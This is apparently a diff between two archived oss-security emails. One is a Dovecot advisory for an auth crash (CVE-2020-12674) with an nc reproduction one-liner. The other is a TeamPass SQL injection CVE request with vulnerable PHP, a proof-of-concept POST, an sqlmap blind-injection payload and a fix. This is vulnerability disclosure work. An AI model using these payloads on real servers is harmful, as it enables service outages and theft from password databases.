@@ -1,9 +1,9 @@
 X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["2131" "Wednesday" "12" "August" "2020" "16:14:46" "+0300" "Aki Tuomi" "aki.tuomi@dovecot.fi" "<23b7bb55-ebda-ced8-59ba-947403204b24@dovecot.fi>" "70" "[oss-security] CVE-2020-12674: Dovecot IMAP server: Specially crafted RPA authentication message crashes auth" "^Date:" nil nil "8" "2020081213:14:46" "[oss-security] CVE-2020-12674: Dovecot IMAP server: Specially crafted RPA authentication message crashes auth" (number mark "        aki.tuomi@do Aug 12   70/2131  " thread-indent "\"[oss-security] CVE-2020-12674: Dovecot IMAP server: Specially crafted RPA authentication message crashes auth\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] CVE-2020-12674: Dovecot IMAP server: Specially crafted RPA authentication message crashes auth" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["4224" "Thursday" "14" "April" "2016" "12:08:26" "+0800" "das das" "scusec2010@gmail.com" "<CAAjTPb_6JSyPtQRR_xCR0gXv7hCqnu2D0MLgu4aBkex=X-wViQ@mail.gmail.com>" "116" "[oss-security] CVE request:SQL injection in TeamPass" "^Date:" nil nil "4" "2016041404:08:26" "[oss-security] CVE request:SQL injection in TeamPass" (number mark "        scusec2010@g Apr 14  116/4224  " thread-indent "\"[oss-security] CVE request:SQL injection in TeamPass\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
 X-Mozilla-Status: 0001
 X-Mozilla-Status2: 00000000
-Received: (qmail 13511 invoked by uid 550); 12 Aug 2020 13:19:41 -0000
+Received: (qmail 11596 invoked by uid 550); 14 Apr 2016 07:05:34 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -11,112 +11,155 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
-Received: (qmail 7779 invoked from network); 12 Aug 2020 13:14:58 -0000
-Autocrypt: addr=aki.tuomi@dovecot.fi; prefer-encrypt=mutual; keydata=
- xsBNBFb7bukBCACpK7GFwH/gyL0oF8t91WM7S+UjuQ1vOQZg2eoCUHi4ILpm1Kae4UeZLB2X
- Vbeph+k29BIQbo+Hjv6rq6JzPfKIZCRLLrkMD1MtA0YB7ZYiACywLrATAdAMJ6sRq+DL5Rlr
- A2CvviTifz6DwEnbqI+ckcKggsY2gywHs5muDw+n5TwLiL0V9IU478vg7OUWzMZ42toTmeTW
- 2MtsIAE5xbnjZ58LUSZR2CNO8SAtDHYI558ACkS0wHBAoRFNv27IPr3cebiPsIglSEIBr0R1
- F1Twbgm6mWVBhK+smDgGxmmuAhH6boSaKWoWAq+tNf+6oXnr3/D0IPtR8c/bZobtvWG3ABEB
- AAHNJ1R1b21pLCBBa2kgPGFraS50dW9taUBvcGVuLXhjaGFuZ2UuY29tPsLAfgQTAQIAKAIb
- AwUJEswDAAUCW2P/aAYLCQgHAwIGFQgCCQoLBBYCAwECHgECF4AACgkQGTtjY7NEQgYmMwf9
- G5U0+vKJB+f3Vl8rjPqlXmUZu4waf6pig5lLCrgu56ZkqEDmjaxmxXAah7JZ6dD/66kzlQzK
- QPYpLor0KnTZgm8XZr+MtqLK8DMF/4+iljADvkS4nfJuX3LbdafPyuk4x+GIa+6NJ+y34jZ2
- 84Oesj+FtPOevthR9rDmnc2KQjBD30ceKsadxIKqWPYPqPESQ0PyMu9tOaWNdGntx8LvO3Ll
- spZ2DzEh5rregFKtO01jR9ai5r3mbUrQqwzWLxJztBYjds8D5VAiCBeivUxetDqhoPr3CyKH
- Stc5GfgHvazjG34H+CShReqIylfR4mwc654qkmVQfPMMUTaa677n8c7ATQRW+27pAQgAosZd
- RB8tui65tjna4iYKPHqcNDZUXOUuPLTucYc2tY2v67POGr44gOZNzuQWKyXRSBs+Q2zJHcbc
- cPe0ZEptkOCOwdhhvBwZLKa6nI9jnJ0K+szT2NbD0YkvaIDALA9pVGMJqa88wvkkocf/I5fk
- dTk6xuLp8AamRXvcPZuUPo/s2PXQV4u+gtKdX1FmaHiBg1oQhtoDWZO04H74r9fyPPs499ra
- 9iNckSlZP51OUFBbV/RmbtEC031r4iXUAgiL0nQ1mNpRIW+PU/5beX/4YwYeCpzy7g0XfMaJ
- oMWDamRdXgzkXK6IJIxwo/89M8qPW+Bkh88yAennI2SsEvniXQARAQABwsBxBBgBAgAbBQJW
- +27pAhsMBAsJCAcGFQoJCAsCBQkSzAMAAAoJEBk7Y2OzREIGCm8IAIZkj5FClx8EmPy1caC+
- CNv1mVrC2YhKY9Zh255JUtt+Xp6tshN6IOr+saNkcwgUghxmx6+asZXPDHTqhXoswPi28k1u
- CY7n4gvh3jlS7a0HeI0sy2RCsrkIaQD2uSt+ju9fpEM2aOXQHGT/x6gZhJ7Uwu+JfDnCB7CB
- FjVnRaV2/87Y0ZImfhIMPYRzwOyWW6KR+JPIutyZAWo9c7mmjKbySLXhqgZariMJU+RQF5/d
- aQsiRJKP1IkC/Ncy/iZSnGvPIRZjvQxtrz+4xexZX6NjG7IbKAwmbo1t27cF3hE4HejakF5b
- LOhznVWubhjXp1J6pL9fymHmG2tZPsgwXcA=
-Message-ID: <23b7bb55-ebda-ced8-59ba-947403204b24@dovecot.fi>
-User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101
- Thunderbird/68.10.0
+Received: (qmail 5215 invoked from network); 14 Apr 2016 04:08:38 -0000
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=gmail.com; s=20120113;
+        h=mime-version:date:message-id:subject:from:to
+         :content-transfer-encoding;
+        bh=P8tG+RRdCluJNMvLXbOn0kpgCovhjezshIJ1FjA3UJ0=;
+        b=HBzj090gn2tWl9ugcLMgtA3/Db6kY08VXVqJQ33U34RlOA0zsDsD0PEFVSUj3m+I/k
+         1R1XgGZt/RLXsu0UVGX8nWkacxgKsJ7OZ2PhcIgEB0z61AC8o7AST6vO0nYY+/RkE1dX
+         lobQugNwKwuAusyKfhDZ8fp8yP8TCLDYXMrUWEb1/1d3yvVe2hDUue87WesE5Kv2/27u
+         APrWkib/DMpcC6yQMjK3UroCvsPMQvHsQWBw6/IjLAVq3t5f5DBn6BxCSmQd+z9qJoIs
+         9vRrwY1IyXgF7Q2O+CW7UbWRNJixp3BvchQOmE8ZXkM/AX8UawRwahhWW75XmVvUpv0u
+         obZQ==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20130820;
+        h=x-gm-message-state:mime-version:date:message-id:subject:from:to
+         :content-transfer-encoding;
+        bh=P8tG+RRdCluJNMvLXbOn0kpgCovhjezshIJ1FjA3UJ0=;
+        b=CVn9Er2gAUM+1KG1NgEVYhh5snZWQzM9mSz35bVmYxzSR7Y6xhy1lMV0gqiwuw/I1w
+         t27AJUGXiKFLmxEVonQjYsytlRiUCfWvGVnS6VJjukhoKU0DwAKEaf/MDzOyoeKrgUSJ
+         PrggAzrab+V7aYWY9y5YzbQvCslH0nb6mTKF9dp5+UK5X4tZ84e9mb0ODOCAmVkeQPho
+         y22jCImxRI2eTOs+K3u3KTwuUsXyq6BUKGVYmTrMLnOsO5Ipzgt0CGTJgqq4bZwPfNNy
+         STfcakjtD537BHw8LqOB4uS8shsVIBUBJgqApMUNP5JrqvcpXV7vbBxJmq35VzjG//w7
+         3KWg==
+X-Gm-Message-State: AOPr4FX70WKdoJa8FlgZTrFB8TORSeg39Tl6hkPM7FYI63i/VaWa6J6zL0Z0WHr6qlzqcejtFG5hDke47oReIQ==
 MIME-Version: 1.0
-Content-Type: multipart/signed; micalg=pgp-sha512;
- protocol="application/pgp-signature";
- boundary="yGCjMcgXWrSvzfaRg3qFLLZeii2NEmqWn"
-Date: Wed, 12 Aug 2020 16:14:46 +0300
-From: Aki Tuomi <aki.tuomi@dovecot.fi>
-Reply-To: oss-security@lists.openwall.com
-Subject: [oss-security] CVE-2020-12674: Dovecot IMAP server: Specially crafted RPA authentication message crashes auth
-To: oss-security <oss-security@lists.openwall.com>,
- full-disclosure <full-disclosure@lists.openwall.com>
-
---yGCjMcgXWrSvzfaRg3qFLLZeii2NEmqWn
-Content-Type: multipart/mixed; boundary="UTvKMdmxBJ3znCdTjQxb7YbH38Xjnh8Qj"
-
---UTvKMdmxBJ3znCdTjQxb7YbH38Xjnh8Qj
-Content-Type: text/plain; charset=utf-8
+X-Received: by 10.182.242.4 with SMTP id wm4mr6509950obc.85.1460606906866;
+ Wed, 13 Apr 2016 21:08:26 -0700 (PDT)
+Message-ID: <CAAjTPb_6JSyPtQRR_xCR0gXv7hCqnu2D0MLgu4aBkex=X-wViQ@mail.gmail.com>
+Content-Type: text/plain; charset=UTF-8
 Content-Transfer-Encoding: quoted-printable
-Content-Language: en-US
+Date: Thu, 14 Apr 2016 12:08:26 +0800
+From: das das <scusec2010@gmail.com>
+Reply-To: oss-security@lists.openwall.com
+Subject: [oss-security] CVE request:SQL injection in TeamPass
+To: oss-security@lists.openwall.com
 
-Open-Xchange Security Advisory 2020-08-12
+Hello again,
+I sent you an email two days ago,which was misformatted.Now I resend
+it from a gmail account.Hope this time it displays normally.
+I'd like to request a CVE-ID for the vulnerability found in
+TeamPass-2.1.24 and TeamPass-2.1.25. TeamPass is a Passwords Manager
+dedicated for managing passwords in a collaborative way on any server
+Apache, MySQL and PHP.
+Here is the issue,
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
+SQL injection vectors in sources/users.queries.php
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
+-------------------------code_start TeamPass-2.1.24-------------------------
+if (!checkUser($_SESSION['user_id'], $_SESSION['key'], "manage_users")) {
+    $_SESSION['error']['code'] =3D ERR_NOT_ALLOWED; //not allowed page
+    include $_SESSION['settings']['cpassman_dir'].'/error.php';
+    exit();
+}
+........
+/**
+* UPDATE MANAGER RIGHTS FOR USER
+*/
+case "gestionnaire":
+  // Check KEY
+  if ($_POST['key'] !=3D $_SESSION['key']) {
+   // error
+    exit();
+    }
+  DB::update(
+    prefix_table("users"),
+    array(
+       'gestionnaire' =3D> $_POST['value']
+      ),
+      "id =3D ".$_POST['id']
+      );
+  break;
+-------------------------code_end TeamPass-2.1.24--------------------------
+-------------------------code_start TeamPass-2.1.25-------------------------
+if (!checkUser($_SESSION['user_id'], $_SESSION['key'], "manage_users")) {
+    $_SESSION['error']['code'] =3D ERR_NOT_ALLOWED; //not allowed page
+    include $_SESSION['settings']['cpassman_dir'].'/error.php';
+    exit();
+}
+........
+/**
+* UPDATE MANAGER RIGHTS FOR USER
+*/
+ case "gestionnaire":
+     // Check KEY
+     if ($_POST['key'] !=3D $_SESSION['key']) {
+         // error
+         exit();
+     }
 
-Affected product: Dovecot IMAP server
-Internal reference: DOP-1869 (Bug ID)
-Vulnerability type: CWE-126 (Buffer over-read)
-Vulnerable version: 2.2
-Vulnerable component: auth
-Fixed version: 2.3.11.3
-Report confidence: Confirmed
-Solution status: Fix available
-Vendor notification: 2020-05-03
-Researcher credit: Orange from DEVCORE team
-CVE reference: CVE-2020-12674
-CVSS: 7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H)
+     DB::update(
+         prefix_table("users"),
+         array(
+             'gestionnaire' =3D> $_POST['value'],
+             'admin' =3D> $_POST['value'] =3D=3D 1 ? "0" : "1",
+             'read_only' =3D> $_POST['value'] =3D=3D 1 ? "0" : "1"
+            ),
+         "id =3D ".$_POST['id']
+     );
+     echo prepareExchangedData(array("error" =3D> ""), "encode");
+     break;
+-------------------------code_end TeamPass-2.1.25--------------------------
 
-Vulnerability Details:
-Dovecot's RPA mechanism implementation accepts zero-length message,
-which leads to assert-crash later on
+When the post parameter 'type' =3D 'gestionnaire', the function 'update
+manager rights for user' will be excuted. it checks the user's role in
+the beginning, and needs the authority of manage_user to access to
+this page
+The SQL injection happens in  ---code_start--- "id =3D ".$_POST['id']
+---code_end---, the post parameter 'id' is not properly handled.
+To execute the SQL query,it verifies that if the the post parameter
+'key' equals session['key'].We can get the key through this
+way=EF=BC=9Arefresh the page(e.g index.php?page=3Dmanage_main), capture the
+packet using tools (e.g Burp Suit), and forward the packet,then we can
+get the value of session 'key' in the request body.
+e.p
+http://localhost/teampass/sources/users.queries.php
+POST:
+type=3Dgestionnaire&key=3DAfVvIafUhSpWwzTnRM9LWEFxrX3gLmK4xoQ4dDDrsPM8.TpnC=
+r&value=3D0&id=3D1'
+Sqlmap payload:
+sqlmap identified the following injection point(s) with a total of 43
+HTTP(s) requests:
+---
+Parameter: id (POST)
+    Type: boolean-based blind
+    Title: MySQL >=3D 5.0 boolean-based blind - Parameter replace
+    Payload: type=3Dgestionnaire&key=3D8ILEoZI08Lkquj5gonpx425wD46ANdkTiIIA=
+JmGVHJhM6S9BaJ&&value=3D1&id=3D(SELECT
+(CASE WHEN (6429=3D6429) THEN 6429 ELSE 6429*(SELECT 6429 FROM
+INFORMATION_SCHEMA.CHARACTER_SETS) END))
+    Vector: (SELECT (CASE WHEN ([INFERENCE]) THEN [RANDNUM] ELSE
+[RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.CHARACTER_SETS)
+END))
+---
+To fix it,
+ ---code_start---
+DB::update(
+         prefix_table("users"),
+         array(
+             'gestionnaire' =3D> $_POST['value'],
+             'admin' =3D> $_POST['value'] =3D=3D 1 ? "0" : "1",
+             'read_only' =3D> $_POST['value'] =3D=3D 1 ? "0" : "1"
+            ),
+         "id =3D %i",
+         $_POST['id']
+     );
+ ---code_end---
 
-Risk:
-An adversary can use this vulnerability to crash dovecot auth process
-repeatedly, preventing login.
-
-Steps to reproduce:
-(echo 'AUTH RPA'; echo -ne
-'\x60\x11\x06\x09\x60\x86\x48\x01\x86\xf8\x73\x01\x01\x01\x00\x04\x00\x00\x=
-01'
-| base64 -w 0; echo ; echo -ne
-'\x60\x11\x06\x09\x60\x86\x48\x01\x86\xf8\x73\x01\x01\x00\x03A@A\x00' |
-base64 -w 0; echo ; echo QUIT) | nc 127.0.0.1 110
-
-Workaround:
-Disable RPA authentication.
-
-Solution:
-Upgrade to fixed version.
-
-Best regards,
-Aki Tuomi
-Open-Xchange oy
-
-
---UTvKMdmxBJ3znCdTjQxb7YbH38Xjnh8Qj--
-
---yGCjMcgXWrSvzfaRg3qFLLZeii2NEmqWn
-Content-Type: application/pgp-signature; name="signature.asc"
-Content-Description: OpenPGP digital signature
-Content-Disposition: attachment; filename="signature.asc"
-
------BEGIN PGP SIGNATURE-----
-
-iQEzBAEBCgAdFiEEQtnWz3vebh9IQVAqGTtjY7NEQgYFAl8z60YACgkQGTtjY7NE
-QgbZJgf7BO/m9MTxSo+TvdeCgY7Uf7yEomJ5v6mFl//KA7M1qDe2QqE/I2lLhoo2
-fpnJoi/cA2/Dnwqg5yvbZEsACwKnO9cuBlQRp5ULSTAIJN2KPDY30IY7A55H98jL
-IL1wU58ZdVlg9ZNSo1Z/HY1WAww3AO/nt5lAlmKcDNUIOomTBj7e7a4Ps51cYUXs
-jBTkJLVYMrBH6GDk69DRyVtlh7XHAorL/XpjdtC6S+m2oR71CAM8Xcg0XBkKvMoC
-Efa56FtCc2DspgC0YFFjlZihT35Z1PETuZCd0sfnHSR/0zygEPkJWc7Fa5HG+JG1
-mSYes+GRjPXxQ5QSKHj4nHk/h7ZtDA==
-=i+nz
------END PGP SIGNATURE-----
-
---yGCjMcgXWrSvzfaRg3qFLLZeii2NEmqWn--
+This issue was discovered by Mereme[D.A.S] of Information Security
+Institute @ Sichuan University.
+Thank you for your time and guidance!
